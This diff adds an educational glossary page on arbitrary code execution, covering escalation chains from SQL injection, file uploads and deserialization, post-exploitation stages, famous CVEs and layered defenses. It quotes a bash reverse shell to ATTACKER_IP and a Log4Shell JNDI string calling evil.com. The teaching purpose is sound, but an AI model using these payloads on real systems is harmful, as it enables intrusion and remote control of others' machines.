@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Arbitrary Code Execution — The Final Boss ☕</title>
+<link rel="stylesheet" href="../assets/styles.css" />
+</head>
+<body data-page-slug="arbitrary-code-execution">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../index.html">Home</a>
+    <a href="../index.html#topics-web">Topics</a>
+    <a href="index.html" class="active">Glossary</a>
+    <a href="../tryhackme/index.html">THM</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="index.html">Glossary</a>
+  <span class="sep">›</span>
+  <span>Arbitrary Code Execution</span>
+</div>
+
+<!-- HERO -->
+<section class="hero" style="min-height: 50vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">📖 glossary · the final boss · severity: 💀💀💀</span>
+    <h1>Arbitrary Code<br>Execution</h1>
+    <p class="subtitle">aka <strong style="color: var(--accent-2);">ACE</strong> — when you can run <em>whatever code you want</em> on someone else's machine.<br>The highest note on the vulnerability scale.</p>
+    <div class="tagline">"if they get here, the game is over." — every SOC analyst ever</div>
+  </div>
+</section>
+
+<!-- WHAT IS IT -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 01 // Definition</div>
+  <h2><span class="emoji">💀</span> What does "arbitrary" even mean here?</h2>
+  <p class="lead"><strong>Arbitrary</strong> = "anything the attacker chooses." Not a predefined set of commands. Not a limited sandbox. <em>Any</em> code.</p>
+
+  <div class="paper">
+    <h4>📝 In human language</h4>
+    <p>Arbitrary Code Execution means an attacker can <span class="highlight">run their OWN program code on YOUR computer or server</span> — as if they were sitting at the keyboard.</p>
+    <p>Read files. Delete files. Install software. Mine crypto. Pivot to the internal network. Steal everything. Leave a backdoor so they can come back tomorrow.</p>
+    <p>If a vulnerability leads to ACE, it's usually rated <strong>CRITICAL</strong>. No exceptions.</p>
+  </div>
+
+  <h3>ACE vs RCE — what's the difference?</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>💻 ACE (Arbitrary Code Execution)</h4>
+      <p>The generic term. You can run arbitrary code somewhere. Could be local (you already have a user account on the machine and you escalate). Could be remote. Could be in a browser tab.</p>
+    </div>
+    <div class="card">
+      <h4>🌐 <span class="term" data-term="rce">RCE</span> (Remote Code Execution)</h4>
+      <p>ACE but <em>over the network</em>. You don't need physical access or a prior account. You hit an HTTP endpoint with a malicious payload and BOOM — your shell pops on their server. RCE is the scariest. Nation-states pay millions for working RCEs.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">the chain of escalation</div>
+
+<!-- HOW WE GET THERE -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 02 // The climb</div>
+  <h2><span class="emoji">🪜</span> How attackers get to ACE</h2>
+  <p class="lead">ACE almost never comes from a single bug. It's a <strong>chain</strong>. A ladder of smaller vulnerabilities stacked until you're on top.</p>
+
+  <h3>Common ladders to ACE</h3>
+  <div class="code">
+<span class="com">// Ladder #1: from SQLi → full server takeover</span>
+<span class="kw">1.</span> Find <span class="inject">SQL injection</span> in a search form
+<span class="kw">2.</span> Dump database creds via UNION attack
+<span class="kw">3.</span> Discover database has <span class="inject">xp_cmdshell</span> enabled (MSSQL) or <span class="inject">INTO OUTFILE</span> (MySQL)
+<span class="kw">4.</span> Write a web shell to the server's web root
+<span class="kw">5.</span> 🎉 Run arbitrary OS commands. You own the server.
+
+<span class="com">// Ladder #2: from file upload → RCE</span>
+<span class="kw">1.</span> Upload form lets you upload images
+<span class="kw">2.</span> It doesn't check file contents, only extension
+<span class="kw">3.</span> Upload <span class="inject">evil.php</span> renamed to <span class="inject">evil.jpg</span> then use path traversal
+<span class="kw">4.</span> Hit <span class="inject">https://target.com/uploads/evil.php</span>
+<span class="kw">5.</span> 🎉 Your PHP runs on their server.
+
+<span class="com">// Ladder #3: from deserialization → instant RCE</span>
+<span class="kw">1.</span> App accepts a serialized object (Java, Python pickle, PHP unserialize)
+<span class="kw">2.</span> You craft a malicious "gadget chain" that executes code on deserialize
+<span class="kw">3.</span> 🎉 Instant RCE, often pre-auth. Log4Shell was in this family.
+  </div>
+
+  <div class="brain-power">
+    <div class="label">🧠 Brain Power</div>
+    <div class="question">Why is <span class="term" data-term="sql-injection">SQL injection</span> sometimes a path to ACE? Isn't SQLi "just" about databases?</div>
+    <button class="reveal-btn" onclick="toggleAnswer(this)">Reveal answer</button>
+    <div class="answer">
+      <p>Because many databases have features that let you interact with the operating system:</p>
+      <ul>
+        <li><strong>MSSQL's <code class="inline">xp_cmdshell</code></strong> — literally runs OS commands from inside SQL.</li>
+        <li><strong>MySQL's <code class="inline">INTO OUTFILE</code></strong> — writes query results to files on the server's disk. Write a web shell, access it via HTTP.</li>
+        <li><strong>PostgreSQL's <code class="inline">COPY ... FROM PROGRAM</code></strong> — executes a program and reads its output.</li>
+        <li><strong>Oracle's <code class="inline">Java / PL/SQL</code> stored procs</strong> — can invoke OS functionality.</li>
+      </ul>
+      <p>If SQLi gives you access to one of these, you've escalated from "read the database" to "execute OS commands." That's ACE. 🎯</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">what they do once they're in</div>
+
+<!-- POST-EXPLOITATION -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 03 // After they pop the shell</div>
+  <h2><span class="emoji">🦹</span> "I have ACE. Now what?"</h2>
+  <p class="lead">Running one command is nice. Staying forever is better. Here's the post-exploitation playbook.</p>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>🐚 1. Pop a <span class="term" data-term="reverse-shell">reverse shell</span></h4>
+      <p>Single command execution is clunky. Upgrade to an interactive shell by making the target connect back to YOUR machine.</p>
+      <div class="code" style="font-size: 11px;">
+<span class="com"># Classic bash reverse shell</span>
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+      </div>
+    </div>
+    <div class="card">
+      <h4>🔓 2. Privilege escalation</h4>
+      <p>You probably landed as a low-privileged user (like <code class="inline">www-data</code>). Time to become <code class="inline">root</code> / <code class="inline">SYSTEM</code>. Look for SUID binaries, kernel exploits, weak sudoers.</p>
+    </div>
+    <div class="card">
+      <h4>🪤 3. Persistence</h4>
+      <p>Plant a backdoor so you can return even if they patch the original vuln. Cron jobs, SSH keys, malicious services, implants.</p>
+    </div>
+    <div class="card">
+      <h4>🌐 4. Lateral movement</h4>
+      <p>The server you pwned is inside their network. Pivot to other machines, scan internal subnets, hit the domain controller. Ransomware crews LOVE this stage.</p>
+    </div>
+    <div class="card">
+      <h4>📦 5. Data exfiltration</h4>
+      <p>Steal the crown jewels: customer database, source code, employee records, financial data. Copy it out slowly to avoid detection.</p>
+    </div>
+    <div class="card">
+      <h4>💰 6. Monetize</h4>
+      <p>Ransomware? Cryptomining? Sell access on darkweb markets? The incentive economy decides the damage level.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">real incidents</div>
+
+<!-- REAL WORLD -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 04 // Legendary ACEs</div>
+  <h2><span class="emoji">🏛️</span> ACE bugs that rocked the world</h2>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <div class="card-badge danger">CVE-2021-44228</div>
+      <h4>☄️ Log4Shell (2021)</h4>
+      <p>A single log message like <code class="inline">${jndi:ldap://evil.com/x}</code> gave you RCE on hundreds of millions of Java apps. Internet-wide panic. Weeks of patching. Still being exploited years later.</p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">CVE-2014-6271</div>
+      <h4>🐚 Shellshock (2014)</h4>
+      <p>A bug in Bash itself. Every web server using CGI scripts — exposed. Pre-auth RCE via HTTP headers. 25+ year old bug, found in 2014. 💀</p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">CVE-2019-19781</div>
+      <h4>🔐 Citrix ADC / NetScaler (2019)</h4>
+      <p>Path traversal + template injection → unauthenticated RCE on VPN boxes. Nation-state groups burned this hard against enterprises.</p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">CVE-2017-5638</div>
+      <h4>🏦 Apache Struts / Equifax (2017)</h4>
+      <p>RCE in Apache Struts. Equifax didn't patch. <strong>147 million Americans</strong> had their SSNs, birthdays, and credit histories stolen. $1.4B+ in damages.</p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">CVE-2021-26855</div>
+      <h4>📧 ProxyLogon (2021)</h4>
+      <p>Pre-auth RCE on Exchange Server. Chinese APT groups mass-exploited tens of thousands of orgs before Microsoft could patch. Chaos.</p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">CVE-2014-0160</div>
+      <h4>❤️ Heartbleed (2014)</h4>
+      <p>Technically info disclosure, not ACE — but the memory leaks gave attackers session keys and creds that led to ACE on millions of servers running OpenSSL.</p>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <strong>💡 Pattern spotting:</strong> Most mega-ACE bugs aren't found in random places — they're found in <em>foundational libraries and frameworks</em> (Log4j, Bash, OpenSSL, Struts). Because those are embedded in millions of apps, one bug = internet-wide impact.
+  </div>
+</section>
+
+<!-- DEFENSE -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 05 // Defending against ACE</div>
+  <h2><span class="emoji">🛡️</span> There is no single fix. Defense is layered.</h2>
+
+  <ul>
+    <li><strong>Patch, patch, patch.</strong> Most ACE breaches happen from known CVEs left unpatched for months. Set up automated patching.</li>
+    <li><strong>Input validation everywhere.</strong> Don't trust ANY input — URL, form, header, cookie, API body.</li>
+    <li><strong>Use <span class="term" data-term="parameterized-query">parameterized queries</span></strong> to kill SQLi-to-ACE chains.</li>
+    <li><strong>Run services as the least-privileged user.</strong> If your webserver runs as <code class="inline">root</code>, an ACE = instant full box ownership. If it runs as <code class="inline">www-data</code>, the attacker still has to escalate.</li>
+    <li><strong>Sandbox / containerize</strong> — Docker, chroot, SELinux, AppArmor. Compartments limit blast radius.</li>
+    <li><strong>WAF</strong> (<span class="term" data-term="waf">web application firewall</span>) — catches obvious payloads. Not a fix, but slows down mass scanners.</li>
+    <li><strong>Monitor + alert</strong> — if a process spawns <code class="inline">/bin/sh</code> when it shouldn't, your EDR should scream.</li>
+    <li><strong>Egress filtering</strong> — block outbound connections from servers that shouldn't be initiating them. Stops reverse shells cold.</li>
+  </ul>
+
+  <div class="quiz">
+    <h4>🎯 Check Yourself</h4>
+    <div class="q">An attacker gets RCE on a company's web server. The webserver runs as the <code class="inline">nobody</code> user and is inside a Docker container. What can they STILL do?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">Nothing — the container fully protects the rest of the system.</div>
+      <div class="opt" onclick="quizAnswer(this, true)">Plenty — read the app's config (including DB creds), attack internal services, try to escape the container, pivot if network allows.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">They have to wait for a root escalation before doing anything useful.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">They can only run commands, not read files.</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<!-- RELATED -->
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="../topics/web/sql-injection/index.html">💉 SQL Injection</a>
+      <a href="single-quote.html">' Single Quote</a>
+      <a href="rce.html" onclick="event.preventDefault();document.getElementById('rce-section').scrollIntoView();">🌐 RCE</a>
+      <a href="reverse-shell.html">🐚 Reverse Shell</a>
+      <a href="parameterized-query.html">🛡️ Parameterized Query</a>
+      <a href="waf.html">🧱 WAF</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">The higher you climb the ladder, the louder the victory. ☕</p>
+  <p style="font-size: 12px;">ACE = full pwnage. Patch your stuff.</p>
+</footer>
+
+<script src="../assets/glossary.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
